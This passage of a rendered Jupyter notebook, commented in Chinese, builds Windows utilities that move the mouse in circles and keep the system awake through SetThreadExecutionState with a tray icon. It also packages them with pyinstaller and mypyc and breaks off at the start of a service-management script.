        <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
            <span class="c1"># 计算当前角度的弧度值</span>
            <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
            <span class="c1"># 计算新坐标</span>
            <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
            <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
            <span class="c1"># 移动鼠标</span>
            <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
            <span class="c1"># 可以调整时间间隔来控制运动速度</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;圆周运动已停止。&#39;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pip<span class="w"> </span>install<span class="w"> </span>pyautogui<span class="w"> </span>pynput
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">tkinter</span> <span class="k">as</span> <span class="nn">tk</span>
<span class="kn">import</span> <span class="nn">pyautogui</span>
<span class="kn">import</span> <span class="nn">math</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>

<span class="k">class</span> <span class="nc">MouseCircleApp</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">root</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">root</span> <span class="o">=</span> <span class="n">root</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s1">&#39;Mouse Circle App&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">geometry</span><span class="p">(</span><span class="s1">&#39;300x100&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">button</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">toggle_circle</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">expand</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        
        <span class="bp">self</span><span class="o">.</span><span class="n">listener</span> <span class="o">=</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_key_press</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">listener</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">toggle_circle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Stop Circle&#39;</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">start_circle</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">start_circle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>
        <span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>
        <span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>

        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
                    <span class="k">break</span>
                <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
                <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
                <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
                <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">on_key_press</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span><span class="o">.</span><span class="n">esc</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">is_alive</span><span class="p">():</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
    <span class="n">app</span> <span class="o">=</span> <span class="n">MouseCircleApp</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
    <span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>--noconsole<span class="w"> </span>circle.py
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<hr />
<p><code>awake.py</code></p>
<p>使用 <code>ctypes</code> 库来调用 Windows API <code>SetThreadExecutionState</code> 防止系统进入睡眠或关闭显示器。</p>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pip<span class="w"> </span>install<span class="w"> </span>pystray<span class="w"> </span>pillow
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">pyautogui</span>
<span class="kn">import</span> <span class="nn">math</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">tkinter</span> <span class="k">as</span> <span class="nn">tk</span>
<span class="kn">from</span> <span class="nn">pystray</span> <span class="kn">import</span> <span class="n">Icon</span><span class="p">,</span> <span class="n">MenuItem</span><span class="p">,</span> <span class="n">Menu</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>

<span class="c1"># Constants for preventing sleep using SetThreadExecutionState API</span>
<span class="n">ES_CONTINUOUS</span> <span class="o">=</span> <span class="mh">0x80000000</span>  <span class="c1"># Ensure the state is reset when the program exits</span>
<span class="n">ES_DISPLAY_REQUIRED</span> <span class="o">=</span> <span class="mh">0x00000002</span>  <span class="c1"># Prevent the display from turning off</span>
<span class="n">ES_SYSTEM_REQUIRED</span> <span class="o">=</span> <span class="mh">0x00000001</span>  <span class="c1"># Prevent the system from entering sleep</span>

<span class="c1"># Global variables for mouse circle functionality</span>
<span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">circle_thread</span> <span class="o">=</span> <span class="kc">None</span>
<span class="n">button</span> <span class="o">=</span> <span class="kc">None</span>

<span class="k">def</span> <span class="nf">prevent_sleep</span><span class="p">():</span>
    <span class="c1"># Call the Windows API to prevent sleep and display off</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">SetThreadExecutionState</span><span class="p">(</span>
        <span class="n">ES_CONTINUOUS</span> <span class="o">|</span> <span class="n">ES_DISPLAY_REQUIRED</span> <span class="o">|</span> <span class="n">ES_SYSTEM_REQUIRED</span>
    <span class="p">)</span>

<span class="k">def</span> <span class="nf">allow_sleep</span><span class="p">():</span>
    <span class="c1"># Reset the system to allow sleep and display off</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">SetThreadExecutionState</span><span class="p">(</span><span class="n">ES_CONTINUOUS</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">keep_awake</span><span class="p">():</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="c1"># Function to simulate user activity to keep the system awake</span>
        <span class="n">prevent_sleep</span><span class="p">()</span>
        <span class="n">pyautogui</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># Slight mouse movement to prevent idle state</span>
        <span class="n">pyautogui</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># Move back to original position</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>  <span class="c1"># Sleep for 3 minutes before repeating</span>

<span class="k">def</span> <span class="nf">on_quit</span><span class="p">(</span><span class="n">icon</span><span class="p">,</span> <span class="n">root</span><span class="p">):</span>
    <span class="c1"># Handle the quit action from the system tray menu</span>
    <span class="n">icon</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>  <span class="c1"># Stop the tray icon</span>
    <span class="n">allow_sleep</span><span class="p">()</span>  <span class="c1"># Allow the system to sleep again</span>
    <span class="n">root</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>  <span class="c1"># Quit the Tkinter main loop</span>
    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Ensure the process exits completely</span>

<span class="k">def</span> <span class="nf">show_window</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
    <span class="c1"># Show the main application window</span>
    <span class="n">root</span><span class="o">.</span><span class="n">deiconify</span><span class="p">()</span>
    <span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>  <span class="c1"># Bring the window to the front</span>

<span class="k">def</span> <span class="nf">hide_window</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
    <span class="c1"># Hide the main application window</span>
    <span class="n">root</span><span class="o">.</span><span class="n">withdraw</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">create_tray_icon</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
    <span class="c1"># Create a system tray icon with a menu</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">,</span> <span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="n">color</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># Simple black icon</span>
    <span class="n">menu</span> <span class="o">=</span> <span class="n">Menu</span><span class="p">(</span>
        <span class="n">MenuItem</span><span class="p">(</span><span class="s1">&#39;Open Window&#39;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">icon</span><span class="p">,</span> <span class="n">item</span><span class="p">:</span> <span class="n">show_window</span><span class="p">(</span><span class="n">root</span><span class="p">),</span> <span class="n">default</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span>
        <span class="n">MenuItem</span><span class="p">(</span><span class="s1">&#39;Exit&#39;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">icon</span><span class="p">,</span> <span class="n">item</span><span class="p">:</span> <span class="n">on_quit</span><span class="p">(</span><span class="n">icon</span><span class="p">,</span> <span class="n">root</span><span class="p">))</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">Icon</span><span class="p">(</span><span class="s1">&#39;Awake&#39;</span><span class="p">,</span> <span class="n">image</span><span class="p">,</span> <span class="s1">&#39;Keep Awake&#39;</span><span class="p">,</span> <span class="n">menu</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">running</span><span class="p">,</span> <span class="n">circle_thread</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">running</span><span class="p">:</span>
        <span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Stop Circle&#39;</span><span class="p">)</span>
        <span class="c1"># Start the circle motion</span>
        <span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="n">circle_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_circle</span><span class="p">)</span>
        <span class="n">circle_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>
        <span class="c1"># Stop the circle motion</span>
        <span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">if</span> <span class="n">circle_thread</span> <span class="ow">and</span> <span class="n">circle_thread</span><span class="o">.</span><span class="n">is_alive</span><span class="p">():</span>
            <span class="n">circle_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">start_circle</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">running</span>
    <span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>
    <span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>
    <span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>

    <span class="k">while</span> <span class="n">running</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">running</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
            <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
            <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
            <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">on_key_press</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">button</span>
    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span><span class="o">.</span><span class="n">esc</span><span class="p">:</span>
        <span class="n">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># Set up the main Tkinter window</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
    <span class="n">root</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s1">&#39;Awake &amp; Circle&#39;</span><span class="p">)</span>
    <span class="n">root</span><span class="o">.</span><span class="n">geometry</span><span class="p">(</span><span class="s1">&#39;350x100&#39;</span><span class="p">)</span>
    <span class="n">root</span><span class="o">.</span><span class="n">resizable</span><span class="p">(</span><span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>  <span class="c1"># Fix the window size</span>
    <span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>  <span class="c1"># Keep the window on top</span>
    <span class="n">root</span><span class="o">.</span><span class="n">protocol</span><span class="p">(</span><span class="s1">&#39;WM_DELETE_WINDOW&#39;</span><span class="p">,</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">hide_window</span><span class="p">(</span><span class="n">root</span><span class="p">))</span>  <span class="c1"># Hide on close</span>

    <span class="c1"># Create the mouse circle button in the main window</span>
    <span class="k">global</span> <span class="n">button</span>
    <span class="n">button</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="n">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">))</span>
    <span class="n">button</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">expand</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="c1"># Start a background thread to keep the system awake</span>
    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">keep_awake</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="c1"># Start the keyboard listener</span>
    <span class="n">listener</span> <span class="o">=</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_key_press</span><span class="p">)</span>
    <span class="n">listener</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="c1"># Create and run the system tray icon</span>
    <span class="n">icon</span> <span class="o">=</span> <span class="n">create_tray_icon</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">icon</span><span class="o">.</span><span class="n">run</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="c1"># Run the Tkinter main loop</span>
    <span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>说明：</p>
<ol>
<li><p><code>SetThreadExecutionState</code>：</p>
<ul>
<li><code>ES_CONTINUOUS</code>：保持该设置直到下一次调用。</li>
<li><code>ES_DISPLAY_REQUIRED</code>：防止屏幕关闭。</li>
<li><code>ES_SYSTEM_REQUIRED</code>：防止系统进入睡眠。</li>
</ul>
</li>
<li><p><strong>防止和恢复</strong>：</p>
<ul>
<li><code>prevent_sleep()</code>：调用后，系统不会进入睡眠或关闭显示器。</li>
<li><code>allow_sleep()</code>：调用后恢复系统默认的电源管理设置。</li>
</ul>
</li>
<li><p><strong>运行和停止</strong>：</p>
<ul>
<li>运行脚本后，它会每分钟保持系统活跃，防止自动熄屏和锁屏。</li>
<li>使用 <code>Esc</code> 和菜单选项 <code>Exit</code> 停止脚本运行，并恢复系统默认设置。</li>
</ul>
</li>
</ol>
<p>注意：</p>
<ul>
<li>这个脚本仅在 Windows 操作系统上有效。</li>
<li><code>SetThreadExecutionState</code> 是 Windows 提供的 API，用于管理电源和系统状态。务必小心使用，防止意外阻止系统进入节能状态。</li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>--noconsole<span class="w"> </span>awake.py
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<hr />
<p><code>setup.py</code></p>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
<span class="kn">from</span> <span class="nn">mypyc.build</span> <span class="kn">import</span> <span class="n">mypycify</span>

<span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s1">&#39;awake&#39;</span><span class="p">,</span>
    <span class="n">ext_modules</span><span class="o">=</span><span class="n">mypycify</span><span class="p">([</span><span class="s1">&#39;awake.py&#39;</span><span class="p">]),</span>
    <span class="n">zip_safe</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
<span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pip<span class="w"> </span>install<span class="w"> </span>mypy
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
python<span class="w"> </span>setup.py<span class="w"> </span>build_ext<span class="w"> </span>--inplace
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<hr />
<p><code>main.py</code></p>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">awake</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">awake</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>  <span class="c1"># 调用编译后的模块的 main 函数</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>main.py
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<hr />
<p>WMI 服务管理与清理自动化</p>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">def</span> <span class="nf">stop_and_disable_service</span><span class="p">(</span><span class="n">service_name</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&#39;&#39;&#39;停止并禁用指定的服务&#39;&#39;&#39;</span>
    <span class="k">try</span><span class="p">:</span>
